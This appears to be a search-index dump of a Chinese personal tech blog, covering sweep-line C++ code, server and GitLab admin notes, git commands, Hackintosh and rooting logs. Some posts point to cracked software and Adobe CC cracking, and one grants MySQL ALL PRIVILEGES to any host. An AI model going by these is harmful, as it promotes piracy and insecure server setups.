list.erase(std::unique(list.begin(),list.end()),list.end()); for(int i=0;i&lt;n;i++){ int lid=std::lower_bound(list.begin(),list.end(),l[i])-list.begin(); int rid=std::lower_bound(list.begin(),list.end(),r[i])-list.begin(); delta[lid]++; delta[rid]--; } int cur=0,ans=0; for(int i=0;i&lt;list.size();i++){ if (cur&gt;0) ans+=(i?list[i]-list[i-1]:0); cur+=delta[i];delta[i]=cur; } std::cout&lt;&lt;ans&lt;&lt;std::endl; } return 0; } 合并请求的离线化处理以上记录增量是拐弯抹角的解法，接下来说明“实用”的处理思路。线段跟线段肯定是有办法合并的，尽量把能合并的线段合成一条后取长度。每一轮合理的合并处理，可以从最左侧一条线段开始，向右逐个拼合，直到不能合并为止，取长度。反复进行这样的几轮处理。 const int maxn=1000010; std::pair&lt;int,int&gt; seg[maxn]; int main(){ int n; while(std::cin&gt;&gt;n){ for(int i=0; i&lt;n; i++){ int l,r; std::cin&gt;&gt;l&gt;&gt;r; seg[i]=std::make_pair(l,r); } std::sort(seg,seg+n); int ans=0,l=seg[0].first,r=seg[0].second; for(int i=0; i&lt;n; i++) if (seg[i].first&lt;=r){ r=std::max(seg[i].second,r); } else{ ans+=r-l; l=seg[i].first; r=seg[i].second; } ans+=r-l; std::cout&lt;&lt;ans&lt;&lt;std::endl; } return 0; } 一维线性的问题可以拓展到二维平面上，长度被面积代替。 JNUOJ1147 Atlantis 已知平面上n个矩形，每个矩形用左上角、右下角的坐标确定，求合并后的总面积。 降维思路说的是二维，其实还是一维问题。矩形宽度（横向）视作线段宽度，高度（纵向）视作附加参数。线段仍然拆分成左右端点，不过引入新的概念，改叫左事件、右事件。 步步为营 扫描线每到一处，就生成并处理该处平行于扫描线方向上的一系列事件。 struct Rectangle{ double x1,y1,x2,y2; Rectangle(double _x1,double _y1,double _x2,double _y2):x1(_x1),x2(_x2),y1(_y1),y2(_y2) {} }; //通过左上角、右下角的坐标确定一个矩形 vector&lt;Rectangle&gt; rects; vector&lt;double&gt; ylist; double unionArea(const vector&lt;Rectangle&gt;&amp; rects,vector&lt;double&gt;&amp; ylist){ if (rects.empty()) return 0; typedef pair&lt;double,pair&lt;int,int&gt; &gt; Event; vector&lt;Event&gt; events; ylist.clear(); for(int i=0; i&lt;rects.size(); ++i){ ylist.push_back(rects[i].y1); ylist.push_back(rects[i].y2); events.push_back(Event(rects[i].x1,make_pair(1,i)));//创建左事件（进入矩形） events.push_back(Event(rects[i].x2,make_pair(-1,i)));//创建右事件（离开矩形） } //纵坐标离散化 sort(ylist.begin(),ylist.end()); ylist.erase(unique(ylist.begin(),ylist.end()),ylist.end()); sort(events.begin(),events.end()); double res=0; vector&lt;int&gt; cnt(ylist.size()-1,0); //处理事件 for(int i=0; i&lt;events.size()-1; ++i){ int delta=events[i].second.first; int rectangle=events[i].second.second; //update count[] 记录增量 int y1=lower_bound(ylist.begin(),ylist.end(),rects[rectangle].y1)-ylist.begin(); int y2=lower_bound(ylist.begin(),ylist.end(),rects[rectangle].y2)-ylist.begin(); for(int j=y1; j&lt;y2; j++) cnt[j]+=delta; //count cutlength 统计增量，得到高度值 double cutLength=0; for(int j=0; j&lt;ylist.size()-1; j++) if (cnt[j]&gt;0) cutLength+=ylist[j+1]-ylist[j]; res+=cutLength*(events[i+1].first-events[i].first);//乘上宽度值，得到面积 } return res; } int main(int argc, char** argv){ ios::sync_with_stdio(false); cout.setf(ios::fixed,ios::floatfield); cout.precision(2); //设置实数输出格式 int n,cas=0; while((cin&gt;&gt;n),n){ rects.clear(); for(int i=0; i&lt;n; i++){ double x1,y1,x2,y2; cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2; rects.push_back(Rectangle(x1,y1,x2,y2)); } cout&lt;&lt;\"Test case #\"&lt;&lt;++cas&lt;&lt;endl; cout&lt;&lt;\"Total explored area: \"&lt;&lt;unionArea(rects,ylist)&lt;&lt;endl&lt;&lt;endl; } return 0; } 单点更新与批量查询 区间更新与批量查询","link":"/posts/fea54540/"},{"title":"在虚拟机中初次安装Kali Linux","text":"尝试多次都安装失败，以为是Surface 3自动关屏引起干扰。 查阅安装说明发现根目录的分区大小不到8GB。 Kali图形安装向导的自动分区只给根目录分配了不到一半的磁盘空间。","link":"/posts/5c50487/"},{"title":"从python2切换到python3的少许体会","text":"print不再是个基本语句而是个函数了，从而可以通过end=”,”属性扩充功能。 不必写from future import ...了。 /成了实数除法运算符，//才能整数除法。 这是最隐性的坑。 input()在同一行接收多个空格分隔的数据就跪了。","link":"/posts/1816bc2f/"},{"title":"破解软件资源收集","text":"VMware Workstation 12.5 Pro虚拟机软件中文版下载(含序列号)","link":"/posts/a9cc03e8/"},{"title":"【161110】服务器管理记录","text":"15 Practical Linux cURL Command Examples typically: curl -O [url] MySQL: allow remote connectionallow connection from arbitrary hostname: mysql&gt;GRANT ALL PRIVILEGES ON . TO ‘[username]‘@’%’ IDENTIFIED BY ‘[password]’ WITH GRANT OPTION;mysql&gt;FLUSH RIVILEGES allow connection from specific hostname: mysql&gt;GRANT ALL PRIVILEGES ON . TO ‘[username]‘@’[hostname]’ IDENTIFIED BY ‘[password]’ WITH GRANT OPTION;mysql&gt;FLUSH RIVILEGES How to locate MySQL configuration file? The file might be in 5 (or more?) locations /etc/my.cnf /etc/mysql/my.cnf $MYSQL_HOME/my.cnf [datadir]/my.cnf ~/.my.cnf How to locate Nginx configuration file?The primary configuration file is /etc/nginx/nginx.conf.Other possible locations include /opt/nginx/conf/. How to locate Apache configuration file? Usually /etc/httpd/conf/httpd.conf. Create an info.php to reveal Apache environment (risky). &lt; ?phpphpinfo();?&gt; Install Apache2, PHP5 And MySQL Support On CentOS 6.5 (LAMP)the Apache service is located at /etc/init.d/httpd. How To Install Linux, nginx, MySQL, PHP (LEMP) stack on CentOS 6","link":"/posts/9171c95d/"},{"title":"【161114】服务器管理记录","text":"Fatal Error: ezSQL_mysql requires mySQL Lib to be compiled and or linked in to the PHP engine yum install php56w-mysql restart Apache Ubuntu升级gcc,g++","link":"/posts/6acc83a6/"},{"title":"GPT与MBR分区表不宜混用","text":"我有一个MBR分区表的HDD，我又有一个GPT分区表的SDD，挂载在一台机器上，并不能同时使用…… HDD上的win7仍能引导，SDD上的Windows Boot Manager就死活不干了。 不是0xc0000001就是0xc0000225。 OS X方面的BootCamp用到的混合分区表又有其局限性。","link":"/posts/cb876a2e/"},{"title":"黑苹果折腾第四迭代之末","text":"暑期，在远景论坛作过大海捞针式的探索追踪，得到了至关重要线索：OS X 10.10(推测)及其以后的版本中，动态内核加载，使得黑苹果变得不稳定、易无缘无故地死机乃至崩溃。 在clover中启用参数关闭此特性，似乎归于平静了。 又尝试升级到10.11.6，变化不明显。 毕竟macOS Sierra已经发布，下一迭代将用台式机来迎接。","link":"/posts/f6de8c59/"},{"title":"Adobe CC 2017 破解并使用","text":"先了解Adobe CC系列软件破解中的“小白”解法 自从2015.05版本移除了外强中干的注册码验证后，风靡一时的Adobe CC系列软件的注册机(by xforce)就被抛在一边。有人盖棺定论地指出，通过替换动态链接库文件足以解除软件使用限制，免去注册破解时对hosts的更改。要走这条路，势必安装试用版。【关键】 难道为了少许方便，就放弃完全安装，牺牲软件体验的完整性吗？ 当然，很多使用者根本不懂得从设计人员的角度去应用这一套地位不凡的软件，也无法做到。 利益相关：没有人去使用注册机，谁去深究逆向工程，实现算法破解？ 正确姿势","link":"/posts/e9537944/"},{"title":"OpenGL编程起步","text":"先不提OpenGL，因为我好像并不懂C++项目的构建。 error LNK2019: 无法解析的外部符号 _WinMain@16，该符号在函数 ___tmainCR… http://blog.csdn.net/playstudy/article/details/6661868 C语言运行时找不到适当的程序入口函数 灵活运用一下 http://www.cnblogs.com/qinfengxiaoyue/archive/2012/05/27/2519706.html 调用库 #pragma comment(lib,”opengl32.lib”)","link":"/posts/1a63acb7/"},{"title":"Win64下某种不正经的汇编开发环境的搭建","text":"编译器masm5.0及其编译、链接产生的看似是16bit可执行文件，在Windows x64系统中即使启用兼容性选项也不能运行。 Windows x64系统中的命令提示符也可能有别于早期MS-DOS系统环境。 这时就考虑用到了DOSBOX，用以仿真一个早期环境。它在访问磁盘分区时必须先挂载： mount C: [dir] DOSBOX要顺利完成文件操作，也需要MS-DOS命令。https://zh.wikipedia.org/wiki/MS-DOS命令列表","link":"/posts/c5ef5b/"},{"title":"Visual Studio- watch the source code of  NET framework","text":"Visual Studio: watch the source code of .NET framework Configure Visual Studio 2013 for debugging .NET framework","link":"/posts/634a89f6/"},{"title":"","text":"http://vimersu.win/blog/2015/10/03/osx-xcode-opengl/ http://stackoverflow.com/questions/5701517/opengl-glew-error-concerning-x11-header-files http://glew.sourceforge.net/install.html http://www.41post.com/5178/programming/opengl-configuring-glfw-and-glew-in-visual-cplusplus-express http://www.jakerobbins.net/20140901/compiling-gl3w-in-windows/","link":"/posts/0/"},{"title":"win10 + gtx1060 + cuda8 0 + vs2013","text":"http://www.cnblogs.com/xuanyuyt/p/5726926.html 安装cuda8.0 1)先去官网下载cuda8.0 https://developer.nvidia.com/cuda-toolkit 2)下载完之后进行安装，安装时间有点长，请耐心等待，默认是安装在c盘目录下 安装完后会生成两个系统变量： CUDA_PATH C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v8.0CUDA_PATH_V8_0 C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v8.03)测试是否成功 : 进入cmd，输入nvcc -V命令，如图所示 表示cuda安装成功 4)进入sdk实例安装目录 C:\\ProgramData\\NVIDIA Corporation\\CUDA Samples\\v8.0点击Samples_vs2013.sln文件打开vs2013执行 运行Samples_vs2013.sln文件就会出现如图所示 表明测试成功 5)使用配置vs2013","link":"/posts/f821475b/"},{"title":"2016-2017 SSL证书更新","text":"在前证书过期一周有余，期末考试完成之后，新的SSL免费证书总算申请上了。 WoSign竟然早已关闭了免费证书申请。这次是向腾讯云申请到的。","link":"/posts/8a2758fe/"},{"title":"Visual Studio -  NET开发杂项","text":"Visual Studio shortcut keys error C2011: ‘’ : ‘class’ type redefinition #pragma once C#语言编写风格 将C++中的-&gt;,::,.合并为一种运算符应当是很有意义的。在编写托管程序时相当具有优势，不必再纠结于*与^，new与gcnew。using语句块可体现其独特性。 StreamReader类 StreamReader不仅采用流的方式，而且对于操作系统中文件的处理更具功能性，能修正字符集错误。 using (StreamReader sr1 = new StreamReader(FILE_INFO_NAME,UnicodeEncoding.GetEncoding(“GB2312”)));StreamReader reader=new StreamReader(fileName,System.Text.Encoding.Default) One-Click Publish 对于使用C#开发的项目，Visual Studio提供了Click-once App打包方式。打包时为了让资源文件也能被包含在生成文件中，需将相关文件build action改为Content。 发布独立可执行文件的注意事项 不要随便拿个Debug生成的可执行文件扔给老哥。Debug 和 Release 的真正秘密，在于一组编译选项。注意工具集和平台运行库的选择。MFC的使用方式。","link":"/posts/a82a58ec/"},{"title":"新游戏构思","text":"现在的手机VR太没劲，如果开发出东方VR是不是能有可玩性？ 那也得有一套玩法才行。有个合适的界面布局。","link":"/posts/ffafa779/"},{"title":"拼尽全力，刷机！解锁！ROOT！","text":"本设备是Redmi Note 2. 在种种失败尝试中，驱动程序不正常是最大的敌人。 有必要先在设备管理器中卸载设备，并勾选删除驱动程序。分别在正常启动、Recovery模式、Fastboot模式下连接并删除驱动。 正常启动后，在小米助手中连接，断开，再连接，务必让驱动安装上。 接下来即可线刷刷入Recovery，撞开了root的大门。 Root后将会出现一个重要appSuperSU. 解锁尚未成功，因为fb模式下设备信息无法识别，但暂时没有必要了。 Failed attempts: http://www.netded.com/a/jingpinshouji/2015/1003/30934.html http://www.netded.com/a/jishuyingyong/2015/0601/30600.html","link":"/posts/ee1bcf7b/"},{"title":"技术革命：人工智能与并行计算之下的绘画自动上色，及其开发准备","text":"安装CUDA与CuDNN(NVIDIA CUDA Deep Neural Network library) CUDA-enabled GPU is necessary. Prepare to get down to the aspiring project.","link":"/posts/4e663a0f/"},{"title":"构建下一艘“核动力航母”","text":"Reference Single CPU performance Single thread performance Multiple CPU performance Remarks on the first “Craft Vessel” E3-1231 V3 gets the almost highest efficiency price ratio.The integrated graphic with Intel QSV technology is not necessary. Also, the single core performance of the CPU turns out to be satisfying, even without locking the frequency multiplier at 38x.If an iGPU were to be appended, E3-1246 v3 are most likely to be accessible. However it is approximate to i7-4770/4790. B85 chipset costs a lot less than Z97,yet supports frequency locking and over-clocking. Kingston Hyper Fury DDR3 RAMs are not economical compared with others. Orientation for the next “Nuclear Craft Vessel” B350 motherboards compatible with Ryzen 7 can be a waste. A320 motherboards have not been launched yet. X99 with DDR4 RAM is quite different from X79 with DDR3. E5-2683 v3 has numerous cores and is affordable, but is not so ideal for its single thread performance. E5-2637 v3 has strengthful single thread performance, but doesn’t have so many cores. Double E5-1620 v3 remain to be inspected.","link":"/posts/afeb6658/"},{"title":"【170305】TOEFL复习","text":"http://mp.weixin.qq.com/s/bqXUoVCAMHki-FI2w0svRQ A degree achieved at collage can prepare undergraduates for social entrance. Not only can students obtain textbook knowledge related to their areas of study, but they also acquire various helpful skills even after their graduation. Collages advocate independent thoughts and innovation. After-class activities such as student communities and the confederacy of student provide with worthwhile opportunities A university degree can better prepare students to enter society. Not only students gain textbook knowledge relating to their specific majors, but they also acquire various that may help them after graduation. Universities always encourage liberal thoughts and creativity. Extracurricular activities such as student clubs and student governments provide students with opportunities to practice their social skills through organizing and supervising meetings and managing funds. All these skills will benefit them for their future careers.","link":"/posts/232661aa/"},{"title":"《并行计算：模型与算法》研读兴趣","text":"《并行计算：模型与算法》研读兴趣 概念：并发、并行与分布式 并发：多个线程在同一时间段内同时执行。更多地考虑控制问题，包括同步和互斥等经典问题。 并行：多个线程在同一时刻同时执行。主要面向具体计算问题。 分布式：多个进程在多个通过网络互联的处理器上同时执行。 回顾算法复杂度的概念 复杂度表示所用到的符号有： $f(n)=\\Theta(g(n))$: 存在常数$c_1 \\ge 0$，$c_2 \\ge 0$，以及正整数$n_0$，对所有$n \\ge n_0$有$0 \\le c_1 g(n) \\le f(n) \\le c_2 g(n)$。 $f(n)=O(g(n))$: 存在常数$c_1 \\ge 0$，以及正整数$n_0$，对所有$n \\ge n_0$有$0 \\le f(n) \\le c_1 g(n)$。 $f(n)=\\Omega(g(n))$: 存在常数$c_1 \\ge 0$，以及正整数$n_0$，对所有$n \\ge n_0$有$0 \\le c_1 g(n) \\le f(n)$。 $f(n)=o(g(n))$: 对任意$c_1 \\ge 0$，存在正整数$n_0$，对所有$n \\ge n_0$有$0 \\le f(n) \\le c_1 g(n)$。 针对并行计算，具有研究价值的算法的简要描述 最大值。输入为一个数组$A[n]={a_1,\\dots,a_n}$，输出该数组中最大值。 矩阵转置。输入为一个按行存储的矩阵$A[n][n]={ a_{11},\\dots,a_{1n};a_{21},\\dots,a_{2n};\\dots;a_{n1},\\dots,a_{nn} }$，输出为矩阵的转置$A’[n][n]={ a_{11},\\dots,a_{n1};a_{12},\\dots,a_{n2};\\dots;a_{1n},\\dots,a_{nn} }$。 $$A’[n][n]={ a_{11},\\dots,a_{n1};a_{12},\\dots,a_{n2};\\dots;a_{1n},\\dots,a_{nn} }$$ {$A’[n][n]={ a_{11},\\dots,a_{n1};a_{12},\\dots,a_{n2};\\dots;a_{1n},\\dots,a_{nn} }$}","link":"/posts/2f304f61/"},{"title":"计算机网络模型与网络设备的工作原理思考","text":"集线器只是用电子器件模拟总线，工作在物理层。 交换机可处理帧工作在数据链路层。 路由器工作在网络层。 强大的网关工作在应用层。","link":"/posts/c6b707a/"},{"title":"Windows7 UEFI安装备忘录","text":"Win7 MSDN安装镜像中缺少了必要的UEFI引导文件，即来自Win8及以后系统的bootmgfw.efi，将其改名并放在合适目录下。 如果采用U盘引导启动，那么“升级”安装往往不能进行。可能需要硬盘引导启动，或者在已正常启动的Win7系统中运行安装程序，而不是系统崩溃后再去“升级”安装。 Windows启动修复主要针对系统引导文件，一定条件下能够重建启动引导菜单。 若有GPT分区表硬盘与MBR分区表硬盘共存，GPT分区表上的bootmgfw.efi不能正常引导启动。","link":"/posts/eab4451e/"},{"title":"Primitive preparation of the applying for graduate program","text":"https://www.zhihu.com/question/29876082 There will be intensified competence to confront, since others’ GPAs are likely to be so high… 2017 NUS summer program should serve as useful science researching experience. It is even viable to turn to the professors there for a recommendation letter. Currently, the prize in ACM contest and mathematic modelling contest are of great significance.","link":"/posts/6e26aa0e/"},{"title":"搭载WinPE的U盘分区优化方案","text":"大胆假设，小心求证。 众多U盘PE制作工具都采取的套路是：隐性地使用UltraISO单文件版向U盘写入现成的PE镜像。写入后U盘前部将多出一个隐藏小分区存放PE（由于Win只能识别U盘上的首个可见分区）。 问题是：制作完成后的PE相当不透明；制作工具还随意篡改卷标，更引入潜在安全隐患。 为了避免制作工具写U盘镜像的不透明性，现手动操作UltraISO单文件版写入镜像。再使用可靠的分区工具变更分区。 操作要点： U盘分区表格式仍使用传统的MBR，以兼容只接受LegacyUSB设备引导的旧主机。 载有PE的分区为激活状态的主分区，FAT32文件系统，移至整个U盘空间后部。 使用合适的分区工具（如Paragon Hard Disk Manager）在前部建立日常存放数据分区，非激活状态的主分区。 经测试，能够在Win下成功挂载、分配盘符，读写数据分区。也可利用BOOTICEx64来回切换可见分区，而无需刻意隐藏分区。 在Win8PE下甚至实现了同时挂载数据分区与PE分区。","link":"/posts/52d28112/"},{"title":"The first campaign against TOEFL","text":"","link":"/posts/cecdbe30/"},{"title":"Airbnb再曝种族歧视问题：房东拒接亚洲客","text":"&lt;div&gt;&lt;img src=&quot;http://n.sinaimg.cn/tech/transform/20170407/0upN-fyecrxv4438545.jpg&quot; data-link=&quot;&quot; alt=&quot;Airbnb再曝种族歧视问题：房东拒接亚洲客&quot;/&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt; &lt;p&gt; 新浪科技讯&amp;nbsp;北京时间4月7日晚间消息，旅行房屋租赁平台Airbnb日前表示，一位房东在得知租客的“亚洲人”身份之后单方面取消了住宿预约，现已永久停止与该涉事房东合作。&lt;/p&gt; &lt;p&gt; Airbnb在接受《赫芬顿邮报》采访时称，该事件发生在今年2月份，位于加州大熊湖（Big&amp;nbsp;Bear）附近。日前，网上出现了一段涉事女租客在雪夜里哭诉委屈的视频，使得该事件得以曝光，并引发了人们的关注。Airbnb以公司隐私政策为由，拒绝透露涉事房东和租客的身份。&lt;/p&gt; &lt;p&gt; 这位女租客在视频中描述了事件原委。她说：“大约一个月前，我们在Airbnb上进行了预订。我当时问女房东，是否可以再加两个人，女房东说可以，只要我们肯加钱。”&lt;/p&gt; &lt;p&gt; 女住客接着说：“我们计划去大熊湖滑雪。住宿问题解决后，我们认为一切就绪，于是准备驱车去大熊湖。随后，我再次向女房东确认，我带了两位朋友一起住宿，是用现金支付吗？”&lt;/p&gt; &lt;p&gt; 没想到对方突然改变态度说：“不行，我们算了吧。”然后挂了电话，并单方面取消了订单。于是，女租客用短信告知房东，将向Airbnb举报她的行为。而女房东则回复称：“去吧，就算地球上只剩你一个人，我也不会租给你。”然后说出拒客原因：“一句话，因为你是亚洲人。”&lt;/p&gt; &lt;p&gt; 此外，女房东在短信中还称：“我不允许这个国家让外国人去告诉我们怎样做。这就是为什么我们选了特朗普。”&lt;/p&gt; &lt;p&gt; 但女租客却称，她是美国公民。显然，女房东只根据女租客的资料照片做出了错误的判断，以为她是外国人。女租客在视频中哭泣着说：“她们看到我是亚洲人，她们看到的只是我的种族。这就是我们所遭受的待遇，让人痛心。”&lt;/p&gt; &lt;p&gt; 对此，Airbnb发言人克里斯托弗·纳尔蒂（Christopher&amp;nbsp;Nulty）在一份声明中称：“房东的行为令人憎恶和无法容忍。”纳尔蒂还称，在得知该事件后，Airbnb立即与女租客取得联系，希望能帮助她们重新预订房间，但女租客已另有安排。&lt;/p&gt; &lt;p&gt; 纳尔蒂还称：“根据我们的非歧视政策，涉事房东已被永久性地从Airbnb平台移除。”&lt;/p&gt; &lt;p&gt; 早在2015年12月，Airbnb就曾曝出种族歧视问题。当时，哈佛大学进行的一项研究表明，如果租客的名字听起来像黑人，在Airbnb上租到房子的概率就会降低。&lt;/p&gt; &lt;p&gt; 去年9月，Airbnb引入新规，旨在反对种族歧视问题。这些新规包括：预订过程中将用户照片最小化，要求用户同意反歧视协议和扩大极速预订范围等。极速预订可以让顾客直接预订，不必经过房东审核批准。（李明）&lt;/p&gt;","link":"/posts/31196879/"},{"title":"鼠标DPI键的隐藏功能","text":"按住DPI键5秒以上，鼠标滚轮功能会切换为音量调节，鼠标中键变为播放/暂停。","link":"/posts/ee5791e2/"},{"title":"黑苹果折腾第六迭代已在路上","text":"第五迭代中凭借积累的经验与clover存档、kext存档，顺利安装了OSX10.11.6，成功仿冒了rMbP。睡眠问题是极难迈过去的坎，通过App Store的某些应用可禁用睡眠，保持稳定。 意外发现是虽然HDMI输出与VGA输出互斥，在引导阶段连上VGA接口就有机会启用VGA视频输出。 现阶段，仿冒iMac(21inch)硬件已到位，NVIDIA及时发布了适用于Pascal架构的显卡驱动。升级系统至macOS Sierra 10.12.4并安装最新NVIDIA web driver即可成功驱动GTX1060，拉开了第六迭代的序幕。 观察新版Clover(版本号＞4000)，Boot without caches选项不复存在，因为macOS 10.12.4启动时始终加载prelinked cache。 macOS不支持Intel VT-d特性，该特性与虚拟机相关。若BIOS启用了相关特性则需要Clover选项dart=0禁用之，否则System panic in nanoseconds。VT-x特性仍受支持。","link":"/posts/5f815801/"},{"title":"【170504】服务器管理记录(CentOS 7 2)","text":"Some port may be blocked by the firewall, thus cannot be visit. iptables -L -n Check /etc/sysconfig/iptables and edit the rules, then restart the iptable service to make it work. service iptables restart tomcat default port See /usr/local/apache-tomcat/conf/server.xml nginx default port ps aux | grep nginx /usr/local/nginx/conf/nginx.conf listen 8080 default_server;listen [::]:8080 default_server ipv6only=on; error adding listener addr=/var/opt/gitlab/gitlab-rails/sockets/gitlab.socket chown git gitlab.socket adding listener failed addr=127.0.0.1:8080 (in use) gitlab-ctl tail unicorn firewalld systemctl unmask firewalld systemctl start firewalld systemctl status firewalld sudo firewall-cmd –permanent –add-service=http nginx configure compatible with gitlab # gitlab socket 文件地址 upstream gitlab { server unix://var/opt/gitlab/gitlab-rails/sockets/gitlab.socket; } server { listen *:8080; server_name gitlab.semprathlon.net; # server_tokens off; # don't show the version number, a security best practice root /opt/gitlab/embedded/service/gitlab-rails/public; # Increase this if you want to upload large attachments # Or if you want to accept large git objects over http client_max_body_size 250m; # individual nginx logs for this gitlab vhost access_log /var/log/gitlab/nginx/gitlab_access.log; error_log /var/log/gitlab/nginx/gitlab_error.log; location / { # serve static files from defined root folder;. # @gitlab is a named location for the upstream fallback, see below try_files $uri $uri/index.html $uri.html @gitlab; } # if a file, which is not found in the root folder is requested, # then the proxy pass the request to the upsteam (gitlab unicorn) location @gitlab { # If you use https make sure you disable gzip compression # to be safe against BREACH attack proxy_read_timeout 300; # Some requests take more than 30 seconds. proxy_connect_timeout 300; # Some requests take more than 30 seconds. proxy_redirect off; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Frame-Options SAMEORIGIN; proxy_pass http://gitlab; } # Enable gzip compression as per rails guide: http://guides.rubyonrails.org/asset_pipeline.html#gzip-compression # WARNING: If you are using relative urls do remove the block below # See config/application.rb under \"Relative url support\" for the list of # other files that need to be changed for relative url support location ~ ^/(assets)/ { root /opt/gitlab/embedded/service/gitlab-rails/public; # gzip_static on; # to serve pre-gzipped version expires max; add_header Cache-Control public; } error_page 502 /502.html; } gitlab 502 error debug gitlab-ctl tail gitlab.socket permission denied sudo usermod -aG gitlab-www git http://www.doocr.com/articles/58b1599ee21ae505cb93a717 chgrp -R gitlab-www /var/opt/gitlab/gitlab-rails chown -R www /var/opt/gitlab/gitlab-rails ./configure, cannot find htmlcxx. Consider adjusting the PKG_CONFIG_PATH environment variable if you installed software in a non-stand … https://askubuntu.com/questions/210210/pkg-config-path-environment-variable export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig error while loading shared libraries: libhtmlcxx.so.3: cannot open shared object file: No such file http://stackoverflow.com/questions/480764/linux-error-while-loading-shared-libraries-cannot-open-shared-object-file-no-s sudo ldconfig","link":"/posts/5b547455/"},{"title":"Github Repo管理重要“灭火救急”技能","text":"放弃本地所有未提交的更改 https://www.v2ex.com/t/66718 git fetch [origin branch-name]git reset –hard [origin/branch-name]git clean -df sync forked reposities https://segmentfault.com/q/1010000002590371 git remote -v git remote add upstream URL git fetch upstreamgit merge upstream/master revoke commit https://segmentfault.com/q/1010000000115900 git reset –hard HEAD~1git push –force","link":"/posts/e30cd2ad/"},{"title":"omnibus-gitlab与系统默认nginx的强行融合","text":"只需从/var/opt/gitlab/nginx/conf/nginx.conf中提取关键配置，插入到系统nginx.conf之中。 将/etc/gitlab/gitlab.rb中的nginx['enable']禁用，unicorn['enable']启用。 sudo gitlab-ctl reconfigure","link":"/posts/b3d73cc5/"},{"title":"Visual Studio for","text":"","link":"/posts/21006057/"},{"title":"Visual Studio for Mac offline installation","text":"Note that the recent release is no longer a preview version. When trying out the Visual Studio Mac downloader from Microsoft, you will find it with “network error” and not pushing forward anymore. However, disconnect the network and it will give in, providing with offline downloading links. It was not possible to complete an automatic installation. This might be due to a problem with your network, proxy servers or an unsolvable installation conflict. At this point, you can continue the installation by manually downloading and installing the independent pieces. The list below shows each component that you need to install. Mono FrameworkDownload the Mono Framework v5.0.0 archive to any directory on your disk, double-click it and follow the instructions on screen. Please accept all the defaults during the installation, including the target drive. Android SDKDownload the Android SDK for Mac OS X version 24.4.1, open the downloaded archive and copy the contents of the folder found at its root directory (most probably named android-sdk-macosx) to the /Users/semprathlon/Library/Developer/Xamarin/android-sdk-macosx directory. Click here in order to start the Android SDK Manager application. In the GUI make sure the following components are installed or selected for installation: Android SDK Tools Android SDK Platform-tools Android SDK Build-tools Android API 15 Android API 19 Android API 21 Once all the required components are selected (you can select others as well, if you wish) start the installation.If you cannot see /Users/semprathlon/Library/Developer/Xamarin/android-sdk-macosx in Finder please click here to reveal the directory in Finder. Download the Android NDK for Mac OS X version r10e, open the downloaded archive and copy the contents of its root directory (most probably named android-ndk-r10e) to the /Users/semprathlon/Library/Developer/Xamarin/android-ndk directory. When the Android SDK installation is finished you might want to start the Android Emulator Manager and create as many emulator images as you might need for your development. This step can be performed at any time, on an as-needed basis. Visual StudioDownload the Visual Studio v7.0.0 archive to any directory on your disk, double-click it and then drag and drop the Visual Studio icon to the Applications folder. Xamarin.AndroidDownload the Xamarin.Android v7.3.0 archive to any directory on your disk, double-click it and follow the instructions on screen. Please accept all the defaults during the installation, including the target drive. Xamarin.iOSDownload the Xamarin.iOS v10.10.0 archive to any directory on your disk, double-click it and follow the instructions on screen. Please accept all the defaults during the installation, including the target drive. Xamarin.MacDownload the Xamarin.Mac v3.4.0 archive to any directory on your disk, double-click it and follow the instructions on screen. Please accept all the defaults during the installation, including the target drive.","link":"/posts/62608b0a/"},{"title":"js ajax发起跨域请求","text":"常见的错误： No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘http://xxx.com' is therefore not allowed access. 禁止跨域请求是浏览器的安全机制的一部分，不能随便绕开。 即便采用axios，本质上仍是XMLHttpRequest，会遇到同样的问题。 在不能触及被请求端的后端的前提下，需要使用代理来启用Access-Control-Allow-Origin。 现在有了一种便捷手段：https://bird.ioliu.cn/ https://segmentfault.com/q/1010000007665348","link":"/posts/d984f30b/"},{"title":"How to compile OpenGL applications with GLUT","text":"Compile manually with mingwSet environment variables $CPATH$ and LIBRARY_PATH to locate glut.h and glut32.lib.If they are not set, use option -I'[include_path]' and -L'[library_path]'. g++ [source_file] -o [target_file] -lfreeglut -lopengl32 -Wl,–subsystem,windows Build with Sublime TextCreate a new build system. {“cmd”: [“g++”, “${file}”, “-o”,”${file_path}/${file_base_name}”,”-lfreeglut”,”-lopengl32”,”-lglu32”,”-Wl,–subsystem,windows”],“working_dir”: “${file_path}”,“variants”:[{“name”: “Run”,“cmd”: [“cmd”,”/C”,”${file_path}/${file_base_name}.exe &amp;pause”]}]} Build with CMakeHelp about configurationsCMakeLists ## OpenGLFIND_PACKAGE(OpenGL REQUIRED)INCLUDE_DIRECTORIES(${OPENGL_INCLUDE_DIR})## OpenGLFIND_PACKAGE(GLUT REQUIRED)INCLUDE_DIRECTORIES(${GLUT_INCLUDE_DIR}) TARGET_LINK_LIBRARIES([project_name] ${OPENGL_LIBRARIES} ${GLUT_LIBRARIES}) Error when starting GLUT app when compiled for 64 bit The application was unable to start correctly (0xc000007b). Click OK to close the application. Make sure to link with the correct (64-bit) version of the library, and there is the correct (64-bit) dll available on the path.","link":"/posts/1439b7a1/"},{"title":"Repair support for Ubuntu everyday usage","text":"https://askubuntu.com/questions/218377/install-remove-language-show-only-english-no-other-choice http://www.linuxdiyf.com/linux/20344.html https://askubuntu.com/questions/455682/14-04-chinese-ibus-input-no-options sudo apt-get –reinstall install language-selector-gnome sudo apt-get install ibus ibus-clutter ibus-gtk ibus-gtk3 ibus-qt4 ibus restart im-config -s ibus sudo ibus-setup","link":"/posts/27ae0269/"},{"title":"The lift story of Rose Frantzen","text":"Rose Frantzen, a relatively young artist, has got a very unususal style as a comtemporary impressionist. However, she lead an arduous life during the days at school. She attended art school, but was told by one of her instructions that she wasn’t good at illustration and should go into advertising instead. She had to take both advertising and fine art classes until she was convinced that her work is good enough so that she could be an artist. Another thing is that she had to paint others’ portraits at somewhere like art fairs just to make monery to buy paint for her more serious work. No matter how hard it was, she never stopped pursuing of impressionism art. Eventually she is doing extremely well.Most of us would have been discouraged if we had to face challenges and difficulties like that. The key point is that you keep at it and never give up. Expercts from 